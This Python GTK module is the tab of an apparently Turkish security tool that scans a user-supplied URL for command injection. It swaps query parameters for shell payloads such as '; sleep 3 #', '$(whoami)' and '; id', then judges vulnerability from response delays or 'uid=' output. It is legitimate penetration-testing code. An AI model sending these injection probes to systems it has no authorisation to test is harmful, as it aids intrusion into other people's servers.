import gi
gi.require_version("Gtk", "3.0")
from gi.repository import Gtk, GLib
import threading
import time
import requests
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse

SLEEP_SECS = 3

PAYLOADS = [
    ("; sleep 3 #", "noktali virgul"),
    ("| sleep 3", "pipe (boru)"),
    ("$(sleep 3)", "komut degistirme"),
    ("`sleep 3`", "ters tik"),
    ("& sleep 3 #", "arka plan + koment"),
    ("|| sleep 3", "OR operatörü"),
]

OUTPUT_PAYLOADS = [
    ("; id", "noktali virgul"),
    ("| whoami", "pipe"),
    ("$(whoami)", "degistirme"),
]

PARAM_NAMES = ["cmd", "command", "exec", "ping", "ip", "host", "hostname", "dns", "shell", "run"]


class CmdInjectionTab(Gtk.Box):
    def __init__(self):
        super().__init__(orientation=Gtk.Orientation.VERTICAL, spacing=12)
        self.set_border_width(24)

        title = Gtk.Label(label="Komut Enjeksiyonu Tarayici")
        title.get_style_context().add_class("title-label")
        title.set_xalign(0)
        self.pack_start(title, False, False, 0)

        desc = Gtk.Label(label="Komut enjeksiyonu (command injection) zafiyetini zamanlama tabanli dener. Uygulama kullanici girdisini kabuk komutuna gecirdiginde 'sleep 3' gibi gecikme payload'lariyla tespit edilir. Bilincli test icindir.")
        desc.get_style_context().add_class("desc-label")
        desc.set_line_wrap(True)
        desc.set_xalign(0)
        self.pack_start(desc, False, False, 0)

        sep = Gtk.Separator()
        self.pack_start(sep, False, False, 4)

        frame = Gtk.Frame(label="Hedef URL (komut parametreli)")
        input_box = Gtk.Box(orientation=Gtk.Orientation.VERTICAL, spacing=8)
        input_box.set_border_width(16)

        hbox = Gtk.Box(spacing=8)
        hbox.set_halign(Gtk.Align.CENTER)
        self.entry = Gtk.Entry(placeholder_text="https://ornek.com/ping.php?ip=127.0.0.1")
        self.entry.set_size_request(420, 30)
        self.entry.connect("activate", lambda _: self.start_scan())
        hbox.pack_start(self.entry, False, False, 0)
        self.scan_btn = Gtk.Button(label="Tara")
        self.scan_btn.connect("clicked", lambda _: self.start_scan())
        self.scan_btn.get_style_context().add_class("suggested-action")
        hbox.pack_start(self.scan_btn, False, False, 0)
        input_box.pack_start(hbox, False, False, 0)

        frame.add(input_box)
        self.pack_start(frame, False, False, 0)

        self.textview = Gtk.TextView()
        self.textview.set_editable(False)
        self.textview.set_monospace(True)
        self.textview.get_style_context().add_class("output-text")
        self.textbuffer = self.textview.get_buffer()
        sw = Gtk.ScrolledWindow()
        sw.set_policy(Gtk.PolicyType.AUTOMATIC, Gtk.PolicyType.AUTOMATIC)
        sw.set_vexpand(True)
        sw.add(self.textview)
        self.pack_start(sw, True, True, 0)

        self.status_label = Gtk.Label(label="")
        self.pack_start(self.status_label, False, False, 0)

        self.running = False

    def log(self, text):
        end = self.textbuffer.get_end_iter()
        self.textbuffer.insert(end, text + "\n")

    def start_scan(self):
        url = self.entry.get_text().strip()
        if not url:
            self.status_label.set_text("URL girin")
            return
        if not url.startswith(("http://", "https://")):
            self.status_label.set_text("URL http/https ile baslamali")
            return
        if "?" not in url:
            self.status_label.set_text("URL bir parametre icermeli (ornek: ?ip=127.0.0.1)")
            return
        if self.running:
            return
        self.running = True
        self.scan_btn.set_sensitive(False)
        self.textbuffer.set_text("")
        self.status_label.set_text("Taranıyor...")
        thread = threading.Thread(target=self.scan, args=(url,), daemon=True)
        thread.start()

    def build_url(self, url, param, value):
        parts = urlparse(url)
        qs = parse_qs(parts.query, keep_blank_values=True)
        target = None
        for name in PARAM_NAMES:
            if name in qs:
                target = name
                break
        if target is None:
            target = param
        qs[target] = [value]
        new_qs = urlencode(qs, doseq=True)
        return urlunparse((parts.scheme, parts.netloc, parts.path, parts.params, new_qs, parts.fragment))

    def timed_get(self, target, timeout=15):
        t0 = time.time()
        try:
            r = requests.get(target, timeout=timeout, verify=False, headers={"User-Agent": "Mozilla/5.0"})
            dt = time.time() - t0
            return r, dt
        except requests.exceptions.SSLError:
            return None, time.time() - t0
        except Exception as e:
            return None, time.time() - t0

    def scan(self, url):
        parts = urlparse(url)
        qs = parse_qs(parts.query)
        params_present = [p for p in PARAM_NAMES if p in qs] or list(qs.keys())[:3]
        if not params_present:
            params_present = ["cmd"]

        GLib.idle_add(self.log, f"[*] Hedef: {url}")
        GLib.idle_add(self.log, f"[*] Denenen parametreler: {', '.join(params_present)}")
        GLib.idle_add(self.log, f"[*] Zaman tabanli tespit: {SLEEP_SECS} sn gecikme araciyor\n")

        vulnerable = False
        for param in params_present:
            GLib.idle_add(self.log, f"--- Parametre: {param} ---")
            baseline_target = self.build_url(url, param, "127.0.0.1")
            base_resp, base_time = self.timed_get(baseline_target)
            GLib.idle_add(self.log, f"  Taban sure: {base_time:.2f} sn")
            for payload, desc in PAYLOADS:
                target = self.build_url(url, param, payload)
                resp, dt = self.timed_get(target)
                line = f"  {desc:>18} ({payload:>14}): {dt:.2f} sn"
                if dt >= base_time + (SLEEP_SECS - 1):
                    vulnerable = True
                    GLib.idle_add(self.log, f"  [ZAFIYET!] {line}  <-- gecikme var")
                    GLib.idle_add(self.log, f"    -> {desc} yontemiyle komut calistiriliyor olabilir")
                else:
                    GLib.idle_add(self.log, f"  [-] {line}")
            GLib.idle_add(self.log, "")

        GLib.idle_add(self.log, "--- Cikti tabanli testler (whoami/id) ---")
        for payload, desc in OUTPUT_PAYLOADS:
            target = self.build_url(url, param, payload)
            try:
                r = requests.get(target, timeout=10, verify=False, headers={"User-Agent": "Mozilla/5.0"})
                body = r.text
                markers = ["uid=", "www-data", "root", "daemon"]
                hit = [m for m in markers if m in body]
                if hit:
                    vulnerable = True
                    GLib.idle_add(self.log, f"  [ZAFIYET!] {desc} ciktisi: {hit}")
                    idx = body.find("uid=")
                    GLib.idle_add(self.log, f"    Kanit: {body[max(0,idx-30):idx+60].strip()[:120]}")
                else:
                    GLib.idle_add(self.log, f"  [-] {desc}: komut ciktisi yansimadi")
            except Exception:
                GLib.idle_add(self.log, f"  [-] {desc}: hata")

        GLib.idle_add(self.log, "\n=== SONUC ===")
        if vulnerable:
            GLib.idle_add(self.log, "  [!] Komut enjeksiyonu zafiyeti olasi!")
            GLib.idle_add(self.log, "  Saldirganin yapabilecekleri:")
            GLib.idle_add(self.log, "  - Sunucuda komut calistirma (whoami, id, ls /)")
            GLib.idle_add(self.log, "  - Reverse shell ile tam sistem kontrolu")
            GLib.idle_add(self.log, "  - Veritabani/kaynak kod/sifre sizdirmasi")
            GLib.idle_add(self.log, "  - Kurcalanmis dosya yukleme, yetki yukseltme")
            GLib.idle_add(self.log, "  Cozum: kullanici girdisini komut katmanina yedeklemeyin; parametreli calistirin ve girdi dogrulayin.")
        else:
            GLib.idle_add(self.log, "  [-] Komut enjeksiyonu tespit edilemedi (parametrelerde).")
            GLib.idle_add(self.log, "  Not: POST, JSON ve HTTP basliklarinda da denenmeli; WAF yaniltici olabilir.")
        GLib.idle_add(self.finish_scan)

    def finish_scan(self):
        self.running = False
        self.scan_btn.set_sensitive(True)
        self.status_label.set_text("Tarama tamamlandi")
